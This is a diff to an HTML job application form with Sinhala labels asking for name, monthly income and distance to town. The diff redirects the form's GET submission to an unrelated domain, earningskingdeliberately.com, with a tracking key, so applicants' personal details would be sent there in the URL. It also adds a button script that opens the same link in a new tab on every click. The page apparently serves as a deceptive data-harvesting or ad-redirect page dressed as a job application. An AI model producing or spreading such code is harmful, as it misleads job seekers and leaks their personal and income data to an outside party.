@@ -64,7 +64,8 @@
 <body>
     <div class="form-container">
         <h1>Job Application</h1>
-        <form action="https://www.aliexpress.com/" method="get">
+        <form action="https://earningskingdeliberately.com/inv0479j?key=dd31a730c4e66217402ec7d1de3d05ef
+        " method="get">
             <div class="form-group">
                 <label for="name">සම්පුර්ණ නම</label>
                 <input type="text" id="name" name="name" placeholder="Enter your name" required>
@@ -82,10 +83,26 @@
                 <input type="number" id="income" name="income" placeholder="Enter your monthly income" required>
             </div>
             <div class="form-group">
-                <label for="distance"> ආසන්න නගරයට ඇති දුර  (km)</label>
+                <label for="distance">ආසන්න නගරයට ඇති දුර  (km)</label>
                 <input type="number" id="distance" name="distance" placeholder="Enter distance in km" required>
             </div>
-            <button type="submit" class="submit-btn">Submit</button>
+            <button id="dynamicButton" onclick="toggleLinks()" 
+            style="background-color: #4caf50; border-radius: 4px; border: none; color: white; cursor: pointer; display: inline-block; font-size: 16px; margin: 4px 2px; padding: 15px 32px; text-align: center; text-decoration: none;">
+        <b>අයදුම් කරන්න</b>
+    </button>
+    
+    <script>
+        let clickCount = 0;
+    
+        function toggleLinks() {
+            clickCount++;
+            if (clickCount % 2 === 1) {
+                window.open('https://earningskingdeliberately.com/inv0479j?key=dd31a730c4e66217402ec7d1de3d05ef', '_blank');
+            } else {
+                window.open('https://earningskingdeliberately.com/inv0479j?key=dd31a730c4e66217402ec7d1de3d05ef', '_blank');
+            }
+        }
+    </script>
         </form>
     </div>
 </body>
